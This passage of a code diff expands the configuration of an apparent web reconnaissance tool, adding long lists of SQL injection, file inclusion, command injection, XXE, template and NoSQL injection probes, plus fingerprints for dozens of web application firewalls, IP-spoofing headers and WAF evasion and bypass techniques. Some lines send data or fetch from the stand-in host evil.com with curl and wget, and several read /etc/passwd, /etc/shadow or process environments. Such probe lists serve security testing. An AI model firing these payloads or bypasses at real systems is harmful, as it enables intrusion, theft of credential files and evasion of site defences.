+                        f"/?sql=1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT('{markers['uuid']}',0x3a,FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x) --",
+                        f"/?sql=1' UNION ALL SELECT 1,2,3,4,'{markers['uuid']}',6 --",
+                        f"/?sql=1' AND 1=CAST('{markers['uuid']}' AS INT) --",
+                        f"/?sql=1'; INSERT INTO temp VALUES('{markers['uuid']}'); --",
+                        f"/?sql=1' AND EXTRACTVALUE(1,CONCAT(0x7e,'{markers['uuid']}',0x7e)) --"
                     ],
                     'lfi_tests': [
                         f"/?file=../../../etc/passwd#{markers['uuid']}",
                         f"/?file=....//....//....//etc/passwd#{markers['uuid']}",
                         f"/?file=/etc/passwd%00{markers['uuid']}",
-                        f"/?file=php://filter/resource=index.php#{markers['uuid']}"
+                        f"/?file=php://filter/resource=index.php#{markers['uuid']}",
+                        f"/?file=../../../windows/system32/drivers/etc/hosts#{markers['uuid']}",
+                        f"/?file=/proc/self/environ#{markers['uuid']}",
+                        f"/?file=/proc/version#{markers['uuid']}",
+                        f"/?file=data:text/plain,{markers['uuid']}",
+                        f"/?file=expect://id#{markers['uuid']}",
+                        f"/?file=php://filter/convert.base64-encode/resource=index#{markers['uuid']}",
+                        f"/?file=zip://test.zip%23{markers['uuid']}.txt",
+                        f"/?file=phar://test.phar/{markers['uuid']}.txt",
+                        f"/?file=/var/log/apache2/access.log#{markers['uuid']}",
+                        f"/?file=/var/log/httpd/access_log#{markers['uuid']}",
+                        f"/?file=/etc/shadow#{markers['uuid']}",
+                        f"/?file=....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts#{markers['uuid']}"
                     ],
                     'rce_tests': [
                         f"/?cmd=id;echo {markers['uuid']}",
                         f"/?cmd=`id`;echo {markers['uuid']}",
                         f"/?cmd=$(id);echo {markers['uuid']}",
-                        f"/?cmd=|id;echo {markers['uuid']}"
+                        f"/?cmd=|id;echo {markers['uuid']}",
+                        f"/?cmd=id&&echo {markers['uuid']}",
+                        f"/?cmd=id||echo {markers['uuid']}",
+                        f"/?cmd=id&echo {markers['uuid']}",
+                        f"/?cmd=id%3Becho+{markers['uuid']}",
+                        f"/?cmd=id%26%26echo+{markers['uuid']}",
+                        f"/?cmd=id%7C%7Cecho+{markers['uuid']}",
+                        f"/?cmd=id%26echo+{markers['uuid']}",
+                        f"/?cmd=whoami;echo {markers['uuid']}",
+                        f"/?cmd=cat /etc/passwd;echo {markers['uuid']}",
+                        f"/?cmd=ls -la;echo {markers['uuid']}",
+                        f"/?cmd=uname -a;echo {markers['uuid']}",
+                        f"/?cmd=ps aux;echo {markers['uuid']}",
+                        f"/?cmd=netstat -an;echo {markers['uuid']}",
+                        f"/?cmd=ifconfig;echo {markers['uuid']}",
+                        f"/?cmd=env;echo {markers['uuid']}",
+                        f"/?cmd=python -c 'import os;os.system(\"echo {markers['uuid']}\")'"
                     ],
                     'xxe_tests': [
                         f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "{markers['uuid']}">]><root>&test;</root>""",
-                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;{markers['uuid']}</root>"""
+                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;{markers['uuid']}</root>""",
+                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root>{markers['uuid']}</root>""",
+                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "expect://id">]><root>&test;{markers['uuid']}</root>""",
+                        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><root>&test;{markers['uuid']}</root>"""
+                    ],
+                    'path_traversal_tests': [
+                        f"/?path=../../../etc/passwd#{markers['uuid']}",
+                        f"/?path=..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts#{markers['uuid']}",
+                        f"/?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd#{markers['uuid']}",
+                        f"/?path=....//....//....//etc//passwd#{markers['uuid']}",
+                        f"/?path=/var/www/html/../../../../etc/passwd#{markers['uuid']}"
+                    ],
+                    'ldap_injection_tests': [
+                        f"/?ldap=admin)({markers['uuid']}=*",
+                        f"/?ldap=*)(uid=*))(|(uid=*#{markers['uuid']}",
+                        f"/?ldap=admin)(!({markers['uuid']}=*)",
+                        f"/?ldap=*)(|(password=*)#{markers['uuid']}"
+                    ],
+                    'ssti_tests': [
+                        f"/?template={{7*7}}{markers['uuid']}",
+                        f"/?template=${{7*7}}{markers['uuid']}",
+                        f"/?template=<%=7*7%>{markers['uuid']}",
+                        f"/?template=#{{{7*7}}}{markers['uuid']}",
+                        f"/?template={{config}}{markers['uuid']}",
+                        f"/?template={{''.__class__.__mro__[2].__subclasses__()}}{markers['uuid']}"
+                    ],
+                    'nosql_injection_tests': [
+                        f"/?nosql[$ne]={markers['uuid']}",
+                        f"/?nosql[$regex]=.*{markers['uuid']}.*",
+                        f"/?nosql[$where]=function(){{return this.password.match(/{markers['uuid']}/)}}",
+                        f"/?nosql[$gt]={markers['uuid']}"
+                    ],
+                    'header_injection_tests': [
+                        f"HTTP/1.1 200 OK\\r\\nX-Injected-Header: {markers['uuid']}\\r\\n\\r\\n",
+                        f"/?redirect=http://evil.com/{markers['uuid']}",
+                        f"/?url=javascript:alert('{markers['uuid']}')"
                     ]
                 },
                 'waf_signatures': {
-                    'cloudflare': ['cf-ray', 'cloudflare', 'ray id'],
-                    'aws_waf': ['x-amzn-trace-id', 'x-amzn-requestid'],
-                    'akamai': ['akamai', 'ak-', 'x-akamai'],
-                    'imperva': ['incap_ses', 'visid_incap', 'imperva'],
-                    'f5_asm': ['f5-bigip', 'bigip', 'f5'],
-                    'barracuda': ['barra', 'cuda'],
-                    'sucuri': ['sucuri', 'x-sucuri'],
-                    'fortinet': ['fortigate', 'fortiweb'],
-                    'citrix': ['netscaler', 'citrix'],
-                    'modsecurity': ['mod_security', 'modsec']
+                    # Major Cloud WAFs
+                    'cloudflare': {
+                        'headers': ['cf-ray', 'cf-cache-status', 'cf-request-id', 'server: cloudflare'],
+                        'cookies': ['__cfduid', '__cf_bm', 'cf_clearance'],
+                        'response_codes': [403, 429, 1020, 1010, 1006],
+                        'body_patterns': ['cloudflare', 'ray id:', 'checking your browser', 'ddos protection'],
+                        'error_pages': ['error 1020', 'error 1006', 'access denied']
+                    },
+                    'aws_waf': {
+                        'headers': ['x-amzn-trace-id', 'x-amzn-requestid', 'x-amz-apigw-id'],
+                        'cookies': [],
+                        'response_codes': [403, 429],
+                        'body_patterns': ['aws', 'amazon', 'blocked by aws waf'],
+                        'error_pages': ['access forbidden', 'request blocked']
+                    },
+                    'azure_waf': {
+                        'headers': ['x-azure-ref', 'x-msedge-ref'],
+                        'cookies': [],
+                        'response_codes': [403, 429],
+                        'body_patterns': ['azure', 'microsoft', 'blocked by azure'],
+                        'error_pages': ['access denied']
+                    },
+                    'google_cloud_armor': {
+                        'headers': ['x-goog-trace', 'x-cloud-trace-context'],
+                        'cookies': [],
+                        'response_codes': [403, 429],
+                        'body_patterns': ['google cloud', 'cloud armor', 'blocked by cloud armor'],
+                        'error_pages': ['access forbidden']
+                    },
+                    
+                    # Major Commercial WAFs
+                    'akamai': {
+                        'headers': ['akamai-origin-hop', 'akamai-transformed', 'x-akamai-transformed'],
+                        'cookies': ['_abck', 'ak_bmsc'],
+                        'response_codes': [403, 429],
+                        'body_patterns': ['akamai', 'reference #', 'akamai ghost'],
+                        'error_pages': ['access denied', 'reference #']
+                    },
+                    'imperva_incapsula': {
+                        'headers': ['x-iinfo', 'x-cdn'],
+                        'cookies': ['incap_ses', 'visid_incap', 'incap_ses'],
+                        'response_codes': [403, 406, 429],
+                        'body_patterns': ['incapsula', 'imperva', 'request unsuccessful'],
+                        'error_pages': ['request unsuccessful', 'incident id']
+                    },
+                    'f5_asm': {
+                        'headers': ['x-f5-bigip', 'f5-bigip', 'bigip'],
+                        'cookies': ['f5_cspm', 'bigipserver', 'f5avraaaaaaaaaaaaaaaa'],
+                        'response_codes': [403, 406],
+                        'body_patterns': ['f5', 'bigip', 'the requested url was rejected'],
+                        'error_pages': ['the requested url was rejected', 'please consult with your administrator']
+                    },
+                    'barracuda': {
+                        'headers': ['x-barracuda-url', 'x-barra-counter'],
+                        'cookies': ['barra_counter_session'],
+                        'response_codes': [403, 404],
+                        'body_patterns': ['barracuda', 'barra', 'blocked by barracuda'],
+                        'error_pages': ['you have been blocked', 'barracuda web application firewall']
+                    },
+                    'citrix_netscaler': {
+                        'headers': ['ns_af', 'citrix_ns_id', 'netscaler'],
+                        'cookies': ['ns_af', 'citrix_ns_id'],
+                        'response_codes': [403],
+                        'body_patterns': ['netscaler', 'citrix', 'access denied'],
+                        'error_pages': ['access denied']
+                    },
+                    'fortinet_fortiweb': {
+                        'headers': ['x-forwarded-for'],
+                        'cookies': ['fortiwafsid'],
+                        'response_codes': [403],
+                        'body_patterns': ['fortinet', 'fortigate', 'fortiweb', 'blocked by fortinet'],
+                        'error_pages': ['web page blocked', 'fortigate']
+                    },
+                    'checkpoint_cloudguard': {
+                        'headers': ['cp_session_id'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['checkpoint', 'cloudguard', 'access denied'],
+                        'error_pages': ['access denied by checkpoint']
+                    },
+                    
+                    # Open Source WAFs
+                    'modsecurity': {
+                        'headers': ['mod_security', 'modsec'],
+                        'cookies': [],
+                        'response_codes': [403, 406, 501],
+                        'body_patterns': ['mod_security', 'modsecurity', 'not acceptable'],
+                        'error_pages': ['not acceptable', 'mod_security action']
+                    },
+                    'nginx_naxsi': {
+                        'headers': ['naxsi/waf'],
+                        'cookies': [],
+                        'response_codes': [403, 418],
+                        'body_patterns': ['naxsi', 'unusual request'],
+                        'error_pages': ['malformed request', 'unusual request']
+                    },
+                    
+                    # Specialized/Security-focused WAFs
+                    'sucuri': {
+                        'headers': ['x-sucuri-id', 'x-sucuri-cache'],
+                        'cookies': ['sucuri_cloudproxy_uuid_'],
+                        'response_codes': [403],
+                        'body_patterns': ['sucuri', 'access denied', 'blocked by sucuri'],
+                        'error_pages': ['access denied', 'questions?']
+                    },
+                    'wordfence': {
+                        'headers': [],
+                        'cookies': ['wfwaf-authcookie'],
+                        'response_codes': [403, 503],
+                        'body_patterns': ['wordfence', 'generated by wordfence'],
+                        'error_pages': ['this response was generated by wordfence', 'your access to this site']
+                    },
+                    'wallarm': {
+                        'headers': ['x-wallarm-mode'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['wallarm', 'blocked by wallarm'],
+                        'error_pages': ['request blocked']
+                    },
+                    'radware': {
+                        'headers': ['x-defended-by'],
+                        'cookies': ['rdx'],
+                        'response_codes': [403],
+                        'body_patterns': ['radware', 'application firewall'],
+                        'error_pages': ['unauthorized request blocked']
+                    },
+                    'edgecast': {
+                        'headers': ['server: ecs'],
+                        'cookies': [],
+                        'response_codes': [403, 400],
+                        'body_patterns': ['edgecast', 'unauthorized request'],
+                        'error_pages': ['unauthorized request']
+                    },
+                    'alert_logic': {
+                        'headers': ['al_sess', 'al_lb'],
+                        'cookies': ['al_sess'],
+                        'response_codes': [403],
+                        'body_patterns': ['alert logic', 'alertlogic'],
+                        'error_pages': ['access denied']
+                    },
+                    'approach': {
+                        'headers': ['approach'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['approach', 'blocked by approach'],
+                        'error_pages': ['blocked by approach']
+                    },
+                    'armor': {
+                        'headers': ['armor'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['armor defense'],
+                        'error_pages': ['blocked by armor']
+                    },
+                    'aws_elb': {
+                        'headers': ['awsalb', 'awsalbcors'],
+                        'cookies': ['awsalb', 'awsalbcors'],
+                        'response_codes': [403, 503],
+                        'body_patterns': ['aws', 'application load balancer'],
+                        'error_pages': ['service temporarily unavailable']
+                    },
+                    'baidu_yunjiasu': {
+                        'headers': ['yunjiasu-nginx'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['yunjiasu', 'baidu'],
+                        'error_pages': ['blocked by yunjiasu']
+                    },
+                    'bekchy': {
+                        'headers': ['bekchy - backend server'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['bekchy'],
+                        'error_pages': ['blocked by bekchy']
+                    },
+                    'binarysec': {
+                        'headers': ['binarysec'],
+                        'cookies': [],
+                        'response_codes': [403, 400],
+                        'body_patterns': ['binarysec', 'blocked by binarysec'],
+                        'error_pages': ['request blocked by binarysec']
+                    },
+                    'blockdos': {
+                        'headers': ['blockdos.net'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['blockdos', 'you have been blocked'],
+                        'error_pages': ['you have been blocked']
+                    },
+                    'cerber': {
+                        'headers': [],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['cerber security', 'access denied'],
+                        'error_pages': ['we are sorry, but this page is blocked', 'cerber security']
+                    },
+                    'chinacache': {
+                        'headers': ['powered-by-chinacache'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['chinacache'],
+                        'error_pages': ['blocked by chinacache']
+                    },
+                    'cloudbric': {
+                        'headers': ['x-cloudbric-request-id'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['cloudbric', 'blocked by cloudbric'],
+                        'error_pages': ['malicious/abnormal request blocked']
+                    },
+                    'comodo': {
+                        'headers': ['protected-by', 'server: cwaf'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['comodo', 'protected by comodo waf'],
+                        'error_pages': ['access denied']
+                    },
+                    'deny_all': {
+                        'headers': ['sessioncookie'],
+                        'cookies': ['sessioncookie'],
+                        'response_codes': [403],
+                        'body_patterns': ['denyall', 'condition intercepted'],
+                        'error_pages': ['condition intercepted']
+                    },
+                    'dotdefender': {
+                        'headers': ['x-dotdefender-denied'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['dotdefender', 'applicure dotdefender'],
+                        'error_pages': ['dotdefender blocked your request']
+                    },
+                    'hyperguard': {
+                        'headers': ['hyperguard'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['hyperguard', 'unauthorized request blocked'],
+                        'error_pages': ['unauthorized request blocked']
+                    },
+                    'jiasule': {
+                        'headers': ['jiasule-waf'],
+                        'cookies': ['jsluid', '__jsluid'],
+                        'response_codes': [403, 400],
+                        'body_patterns': ['jiasule', 'static.jiasule.com'],
+                        'error_pages': ['notice-jiasule']
+                    },
+                    'knownsec': {
+                        'headers': ['ks-waf'],
+                        'cookies': [],
+                        'response_codes': [403, 555],
+                        'body_patterns': ['knownsec', 'ks-waf', 'blocked by knownsec'],
+                        'error_pages': ['request denied by knownsec']
+                    },
+                    'malcare': {
+                        'headers': [],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['malcare', 'firewall', 'blocked by malcare'],
+                        'error_pages': ['blocked because of malicious activities']
+                    },
+                    'newdefend': {
+                        'headers': ['newdefend'],
+                        'cookies': [],
+                        'response_codes': [403, 412],
+                        'body_patterns': ['newdefend', 'request blocked'],
+                        'error_pages': ['request blocked']
+                    },
+                    'nsfocus': {
+                        'headers': ['nsfocus'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['nsfocus', 'blocked by nsfocus'],
+                        'error_pages': ['blocked by nsfocus waf']
+                    },
+                    'palo_alto': {
+                        'headers': ['server: pa-vm'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['palo alto', 'pan-os'],
+                        'error_pages': ['access denied']
+                    },
+                    'profense': {
+                        'headers': ['profense'],
+                        'cookies': [],
+                        'response_codes': [403, 406],
+                        'body_patterns': ['profense', 'plixer'],
+                        'error_pages': ['request blocked by profense']
+                    },
+                    'reblaze': {
+                        'headers': ['rbzid'],
+                        'cookies': ['rbzid'],
+                        'response_codes': [403],
+                        'body_patterns': ['reblaze', 'current request blocked'],
+                        'error_pages': ['current request blocked']
+                    },
+                    'safe3': {
+                        'headers': ['safe3waf'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['safe3', 'safe3 web application firewall'],
+                        'error_pages': ['safe3 web application firewall']
+                    },
+                    'safedog': {
+                        'headers': ['server: safedog', 'safedog'],
+                        'cookies': ['safedog-flow-item'],
+                        'response_codes': [403, 404, 405],
+                        'body_patterns': ['safedog', 'wangzhan', '404 not found'],
+                        'error_pages': ['404 not found']
+                    },
+                    'secupress': {
+                        'headers': [],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['secupress', 'blocked by secupress'],
+                        'error_pages': ['cool, you are totally forbidden']
+                    },
+                    'securi': {
+                        'headers': ['x-sucuri-id'],
+                        'cookies': ['sucuri_cloudproxy_uuid'],
+                        'response_codes': [403],
+                        'body_patterns': ['sucuri', 'cloudproxy'],
+                        'error_pages': ['access denied']
+                    },
+                    'senginx': {
+                        'headers': ['senginx'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['senginx', 'blocked by senginx'],
+                        'error_pages': ['blocked by senginx']
+                    },
+                    'shadow_daemon': {
+                        'headers': ['shadowd_ui'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['shadowd', 'shadow daemon'],
+                        'error_pages': ['request blocked by shadow daemon']
+                    },
+                    'shieldsecurity': {
+                        'headers': [],
+                        'cookies': ['icwp-wpsf'],
+                        'response_codes': [403],
+                        'body_patterns': ['shield security', 'icwp'],
+                        'error_pages': ['you were blocked by the shield']
+                    },
+                    'sonicwall': {
+                        'headers': ['sonicwall'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['sonicwall', 'this request is blocked'],
+                        'error_pages': ['this request is blocked by sonicwall']
+                    },
+                    'sophos': {
+                        'headers': ['spdy'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['sophos', 'blocked by sophos'],
+                        'error_pages': ['blocked by sophos utm']
+                    },
+                    'stingray': {
+                        'headers': ['x-mapping'],
+                        'cookies': [],
+                        'response_codes': [403, 500],
+                        'body_patterns': ['stingray', 'riverbed stingray'],
+                        'error_pages': ['request rejected']
+                    },
+                    'tencent_cloud': {
+                        'headers': ['server: tencent-cls'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['tencent', 'qcloud'],
+                        'error_pages': ['blocked by tencent cloud waf']
+                    },
+                    'usp_secure_entry': {
+                        'headers': ['usp-se'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['usp secure entry server'],
+                        'error_pages': ['request denied by usp secure entry server']
+                    },
+                    'varnish': {
+                        'headers': ['x-varnish', 'via'],
+                        'cookies': [],
+                        'response_codes': [403, 503],
+                        'body_patterns': ['varnish', 'guru meditation'],
+                        'error_pages': ['guru meditation', 'varnish cache server']
+                    },
+                    'webknight': {
+                        'headers': ['webknight'],
+                        'cookies': [],
+                        'response_codes': [403, 999],
+                        'body_patterns': ['webknight', 'http error 999'],
+                        'error_pages': ['blocked by webknight']
+                    },
+                    'yundun': {
+                        'headers': ['server: yundun'],
+                        'cookies': ['yunsuo_session'],
+                        'response_codes': [403],
+                        'body_patterns': ['yundun', 'blocked by yundun'],
+                        'error_pages': ['blocked by yundun']
+                    },
+                    'zenedge': {
+                        'headers': ['x-zen-fury'],
+                        'cookies': [],
+                        'response_codes': [403],
+                        'body_patterns': ['zenedge', 'request blocked'],
+                        'error_pages': ['request has been blocked']
+                    }
                 },
                 'headers': {
                     'User-Agent': f'Mozilla/5.0 (WAF-Test-{markers["uuid"]})',
                     'X-WAF-Test': markers['uuid'],
-                    'X-Attack-Test': markers['sequence']
+                    'X-Attack-Test': markers['sequence'],
+                    'X-Forwarded-For': '127.0.0.1',
+                    'X-Originating-IP': '127.0.0.1',
+                    'X-Remote-IP': '127.0.0.1',
+                    'X-Client-IP': '127.0.0.1',
+                    'X-Real-IP': '127.0.0.1',
+                    'Client-IP': '127.0.0.1',
+                    'True-Client-IP': '127.0.0.1',
+                    'X-Cluster-Client-IP': '127.0.0.1'
+                },
+                
+                # Advanced detection methods
+                'advanced_detection': {
+                    'timing_based_detection': {
+                        'enabled': True,
+                        'threshold_ms': 100,  # Delay indicating WAF processing
+                        'multiple_requests': True,
+                        'baseline_requests': 3
+                    },
+                    
+                    'response_analysis': {
+                        'status_code_patterns': {
+                            'blocked': [403, 406, 412, 418, 429, 501, 503],
+                            'rate_limited': [429, 509],
+                            'suspicious': [400, 404, 405, 406, 412, 413, 414, 415, 416, 417, 418, 422, 429, 431, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511]
+                        },
+                        
+                        'content_length_analysis': {
+                            'enabled': True,
+                            'suspicious_ranges': [
+                                (0, 50),      # Very short responses
+                                (200, 500),   # Typical error page size
+                                (1000, 2000), # Common WAF error page size
+                                (5000, 8000)  # Large WAF error pages
+                            ]
+                        },
+                        
+                        'response_time_analysis': {
+                            'enabled': True,
+                            'baseline_samples': 5,
+                            'anomaly_threshold': 2.0,  # Standard deviations
+                            'waf_processing_indicators': {
+                                'min_delay_ms': 50,
+                                'max_delay_ms': 5000,
+                                'pattern_analysis': True
+                            }
+                        }
+                    },
+                    
+                    'evasion_techniques': {
+                        'case_variation': [
+                            'SCRIPT', 'Script', 'ScRiPt', 'sCrIpT'
+                        ],
+                        'encoding_variations': [
+                            'url_encode', 'double_url_encode', 'hex_encode', 
+                            'unicode_encode', 'html_encode'
+                        ],
+                        'payload_fragmentation': {
+                            'enabled': True,
+                            'fragment_sizes': [1, 2, 4, 8, 16],
+                            'delay_between_fragments': 0.1
+                        },
+                        'parameter_pollution': {
+                            'enabled': True,
+                            'pollution_patterns': [
+                                'param=value1&param=value2',
+                                'param[]=value1&param[]=value2',
+                                'param.x=value1&param.y=value2'
+                            ]
+                        }
+                    },
+                    
+                    'bypass_attempts': {
+                        'ip_spoofing_headers': [
+                            'X-Forwarded-For', 'X-Real-IP', 'X-Client-IP',
+                            'X-Originating-IP', 'X-Remote-IP', 'Client-IP',
+                            'True-Client-IP', 'X-Cluster-Client-IP'
+                        ],
+                        'protocol_manipulation': {
+                            'http_version_downgrade': ['HTTP/1.0', 'HTTP/0.9'],
+                            'method_override': [
+                                'X-HTTP-Method-Override: PUT',
+                                'X-HTTP-Method-Override: DELETE',
+                                'X-Method-Override: PATCH'
+                            ],
+                            'content_type_confusion': [
+                                'application/json', 'text/plain', 'multipart/form-data',
+                                'application/x-www-form-urlencoded', 'text/xml'
+                            ]
+                        },
+                        'request_smuggling_tests': {
+                            'cl_te_smuggling': True,
+                            'te_cl_smuggling': True,
+                            'te_te_smuggling': True
+                        }
+                    },
+                    
+                    'fingerprinting_payloads': {
+                        'error_based_fingerprinting': [
+                            # Payloads designed to trigger specific WAF error messages
+                            f"/?error=<script>alert('WAF-{markers['uuid']}')</script>",
+                            f"/?error=' OR 1=1--{markers['uuid']}",
+                            f"/?error=../../../etc/passwd#{markers['uuid']}",
+                            f"/?error=<?xml version='1.0'?><root>{markers['uuid']}</root>",
+                            f"/?error={{7*7}}{markers['uuid']}",
+                            f"/?error=cmd.exe|echo {markers['uuid']}",
+                            f"/?error=cat /proc/version#{markers['uuid']}",
+                            f"/?error=wget http://evil.com/{markers['uuid']}",
+                            f"/?error=curl -d 'data={markers['uuid']}' http://evil.com/",
+                            f"/?error=python -c 'print(\"{markers['uuid']}\")'",
+                            f"/?error=perl -e 'print \"{markers['uuid']}\"'",
+                            f"/?error=ruby -e 'puts \"{markers['uuid']}\";'",
+                            f"/?error=php -r 'echo \"{markers['uuid']}\";'",
+                            f"/?error=node -e 'console.log(\"{markers['uuid']}\")'",
+                            f"/?error=powershell -c 'echo {markers['uuid']}'",
+                            f"/?error=/bin/sh -c 'echo {markers['uuid']}'",
+                            f"/?error=cmd /c echo {markers['uuid']}"
+                        ],
+                        
+                        'protocol_specific_tests': {
+                            'http2_specific': [
+                                # HTTP/2 specific payloads that might bypass HTTP/1.1 WAFs
+                                f"/:method=POST /:path=/admin /:scheme=https host:evil.com#{markers['uuid']}",
+                                f"/:method=CONNECT /:authority=evil.com:443#{markers['uuid']}"
+                            ],
+                            'websocket_upgrade': [
+                                f"GET / HTTP/1.1\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\nSec-WebSocket-Key: {markers['uuid']}\\r\\n"
+                            ]
+                        }
+                    },
+                    
+                    'waf_behavior_analysis': {
+                        'rate_limiting_detection': {
+                            'enabled': True,
+                            'request_burst_size': 50,
+                            'burst_interval': 1.0,  # seconds
+                            'rate_limit_indicators': [
+                                'too many requests', 'rate limit exceeded', 
+                                'quota exceeded', 'throttled'
+                            ]
+                        },
+                        
+                        'geo_blocking_detection': {
+                            'enabled': True,
+                            'country_headers': [
+                                'CF-IPCountry', 'X-Country-Code', 'X-GeoIP-Country',
+                                'CloudFront-Viewer-Country', 'X-Akamai-Edgescape'
+                            ],
+                            'blocked_indicators': [
+                                'geo blocked', 'country not allowed', 
+                                'region blocked', 'geographic restriction'
+                            ]
+                        },
+                        
+                        'bot_detection_analysis': {
+                            'enabled': True,
+                            'bot_challenge_indicators': [
+                                'javascript challenge', 'captcha', 'bot detection',
+                                'human verification', 'proof of work', 'challenge page'
+                            ],
+                            'bot_headers': [
+                                'CF-Bot-Management-Verified', 'X-Bot-Score', 
+                                'X-Human-Challenge', 'X-Captcha-Required'
+                            ]
+                        }
+                    },
+                    
+                    'machine_learning_detection': {
+                        'enabled': False,  # Requires ML model training
+                        'behavioral_analysis': {
+                            'request_patterns': True,
+                            'timing_patterns': True,
+                            'payload_similarity': True,
+                            'response_clustering': True
+                        },
+                        'anomaly_detection': {
+                            'statistical_analysis': True,
+                            'outlier_detection': True,
+                            'pattern_recognition': True
+                        }
+                    },
+                    
+                    'custom_rule_detection': {
+                        'enabled': True,
+                        'rule_categories': [
+                            'custom_xss_rules', 'custom_sqli_rules', 
+                            'custom_rce_rules', 'custom_lfi_rules'
+                        ],
+                        'signature_extraction': {
+                            'error_message_analysis': True,
+                            'response_header_analysis': True,
+                            'timing_pattern_analysis': True
+                        }
+                    }
+                },
+                
+                # WAF-specific bypass techniques
+                'bypass_techniques': {
+                    'cloudflare_bypasses': [
+                        'origin_ip_discovery', 'subdomain_enumeration',
+                        'dns_history_analysis', 'certificate_transparency'
+                    ],
+                    'aws_waf_bypasses': [
+                        'regional_endpoint_discovery', 'api_gateway_enumeration',
+                        'lambda_direct_invocation'
+                    ],
+                    'generic_bypasses': [
+                        'case_variation', 'encoding_obfuscation', 
+                        'parameter_pollution', 'header_manipulation',
+                        'protocol_confusion', 'request_smuggling',
+                        'chunked_encoding', 'multipart_bypass'
+                    ]
+                },
+                
+                # False positive detection
+                'false_positive_analysis': {
+                    'enabled': True,
+                    'confidence_scoring': {
+                        'high_confidence_indicators': [
+                            'specific_waf_headers', 'known_error_pages',
+                            'consistent_blocking_behavior', 'timing_signatures'
+                        ],
+                        'medium_confidence_indicators': [
+                            'generic_error_messages', 'suspicious_status_codes',
+                            'response_time_anomalies'
+                        ],
+                        'low_confidence_indicators': [
+                            'generic_403_responses', 'inconsistent_behavior',
+                            'no_clear_signatures'
+                        ]
+                    },
+                    'verification_tests': {
+                        'legitimate_request_test': True,
+                        'baseline_comparison': True,
+                        'multiple_payload_confirmation': True,
+                        'timing_consistency_check': True
+                    }
                 }
             },
 
-            # Layer 4: API Gateway Detection
+            # Layer 4: API Gateway Detection (Versione Espansa)
             'api_gateway_detection': {
                 'priority': 4,
                 'headers': {
                     'X-API-Gateway-Test': markers['uuid'],
                     'Authorization': f'Bearer test-{markers["sequence"]}',
                     'X-API-Key': f'test-key-{markers["uuid"]}',
-                    'X-Client-ID': markers['uuid']
+                    'X-Client-ID': markers['uuid'],
+                    'X-Forwarded-For': '127.0.0.1',
+                    'X-Real-IP': '127.0.0.1',
+                    'X-Request-ID': markers['uuid'],
+                    'X-Correlation-ID': markers['uuid'],
+                    'User-Agent': f'StackRecon/1.0 ({markers["uuid"]})',
+                    'Accept': 'application/json, application/xml, text/plain',
+                    'Content-Type': 'application/json'
                 },
                 'api_tests': {
                     'rate_limiting': {
-                        'requests_per_second': [1, 5, 10, 50, 100],
-                        'burst_patterns': [10, 20, 50, 100]
+                        'requests_per_second': [1, 5, 10, 25, 50, 75, 100, 150, 200],
+                        'burst_patterns': [5, 10, 20, 30, 50, 75, 100, 150, 200],
+                        'concurrent_requests': [1, 5, 10, 20, 50],
+                        'rate_limit_window': ['1s', '1m', '1h', '24h']
                     },
                     'auth_mechanisms': [
-                        'bearer_token', 'api_key', 'oauth2', 'jwt', 'basic_auth'
+                        'bearer_token', 'api_key', 'oauth2', 'jwt', 'basic_auth',
+                        'hmac_signature', 'mutual_tls', 'digest_auth', 'hawk_auth',
+                        'oauth1', 'saml', 'openid_connect', 'custom_header'
                     ],
                     'routing_tests': [
                         f'/api/v1/test-{markers["uuid"]}',
                         f'/api/v2/test-{markers["uuid"]}',
+                        f'/api/v3/test-{markers["uuid"]}',
+                        f'/v1/test-{markers["uuid"]}',
+                        f'/v2/test-{markers["uuid"]}',
                         f'/graphql?query={{test(id:"{markers["uuid"]}")}}',
                         f'/rest/test/{markers["uuid"]}',
-                        f'/gateway/test/{markers["uuid"]}'
-                    ]
+                        f'/gateway/test/{markers["uuid"]}',
+                        f'/proxy/test/{markers["uuid"]}',
+                        f'/api/test/{markers["uuid"]}',
